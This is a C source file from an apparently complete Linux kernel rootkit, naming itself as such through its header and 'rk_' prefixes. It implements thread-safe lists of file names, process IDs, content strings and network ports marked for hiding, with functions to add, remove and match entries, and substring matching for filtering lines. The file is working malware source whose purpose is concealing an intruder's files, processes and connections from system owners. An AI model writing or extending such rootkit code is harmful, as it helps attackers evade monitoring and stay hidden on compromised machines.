// SPDX-License-Identifier: GPL-2.0
// core/target.c - Thread-safe target lists for hiding files, PIDs,
//                 content strings, and ports.
#include <linux/errno.h>
#include <linux/string.h>

#include "rootkit.h"

struct rk_target_list rk_file_targets;
struct rk_target_list rk_pid_targets;
struct rk_target_list rk_content_targets;
struct rk_port_list   rk_port_targets;

/* ---- String target list ---- */

void rk_target_init(struct rk_target_list *tl)
{
	spin_lock_init(&tl->lock);
	tl->count = 0;
}

int rk_target_add(struct rk_target_list *tl, const char *value)
{
	int error = 0;
	unsigned long flags;

	spin_lock_irqsave(&tl->lock, flags);
	if (tl->count >= RK_MAX_TARGETS) {
		error = -ENOSPC;
	} else if (strlen(value) >= RK_TARGET_LEN) {
		error = -ENAMETOOLONG;
	} else {
		strscpy(tl->targets[tl->count], value, RK_TARGET_LEN);
		tl->count++;
	}
	spin_unlock_irqrestore(&tl->lock, flags);
	return error;
}

int rk_target_remove(struct rk_target_list *tl, const char *value)
{
	unsigned long flags;
	int i, j;

	spin_lock_irqsave(&tl->lock, flags);
	for (i = 0; i < tl->count; i++) {
		if (strcmp(tl->targets[i], value) == 0) {
			for (j = i; j < tl->count - 1; j++)
				strscpy(tl->targets[j], tl->targets[j + 1],
					RK_TARGET_LEN);
			tl->count--;
			spin_unlock_irqrestore(&tl->lock, flags);
			return 0;
		}
	}
	spin_unlock_irqrestore(&tl->lock, flags);
	return -ENOENT;
}

bool rk_target_match(struct rk_target_list *tl, const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&tl->lock, flags);
	for (i = 0; i < tl->count; i++) {
		if (strcmp(tl->targets[i], name) == 0) {
			spin_unlock_irqrestore(&tl->lock, flags);
			return true;
		}
	}
	spin_unlock_irqrestore(&tl->lock, flags);
	return false;
}

bool rk_line_matches(struct rk_target_list *tl, const char *line, size_t len)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&tl->lock, flags);
	for (i = 0; i < tl->count; i++) {
		size_t tlen = strlen(tl->targets[i]);

		if (tlen <= len && memchr(line, tl->targets[i][0], len)) {
			const char *p = line;
			const char *end = line + len - tlen + 1;

			while (p < end) {
				if (memcmp(p, tl->targets[i], tlen) == 0) {
					spin_unlock_irqrestore(&tl->lock, flags);
					return true;
				}
				p++;
			}
		}
	}
	spin_unlock_irqrestore(&tl->lock, flags);
	return false;
}

/* ---- Port target list ---- */

void rk_port_init(struct rk_port_list *pl)
{
	spin_lock_init(&pl->lock);
	pl->count = 0;
}

int rk_port_add(struct rk_port_list *pl, unsigned short port)
{
	int error = 0;
	unsigned long flags;

	spin_lock_irqsave(&pl->lock, flags);
	if (pl->count >= RK_MAX_TARGETS)
		error = -ENOSPC;
	else {
		pl->ports[pl->count] = port;
		pl->count++;
	}
	spin_unlock_irqrestore(&pl->lock, flags);
	return error;
}

int rk_port_remove(struct rk_port_list *pl, unsigned short port)
{
	unsigned long flags;
	int i, j;

	spin_lock_irqsave(&pl->lock, flags);
	for (i = 0; i < pl->count; i++) {
		if (pl->ports[i] == port) {
			for (j = i; j < pl->count - 1; j++)
				pl->ports[j] = pl->ports[j + 1];
			pl->count--;
			spin_unlock_irqrestore(&pl->lock, flags);
			return 0;
		}
	}
	spin_unlock_irqrestore(&pl->lock, flags);
	return -ENOENT;
}

bool rk_port_match(struct rk_port_list *pl, unsigned short port)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&pl->lock, flags);
	for (i = 0; i < pl->count; i++) {
		if (pl->ports[i] == port) {
			spin_unlock_irqrestore(&pl->lock, flags);
			return true;
		}
	}
	spin_unlock_irqrestore(&pl->lock, flags);
	return false;
}
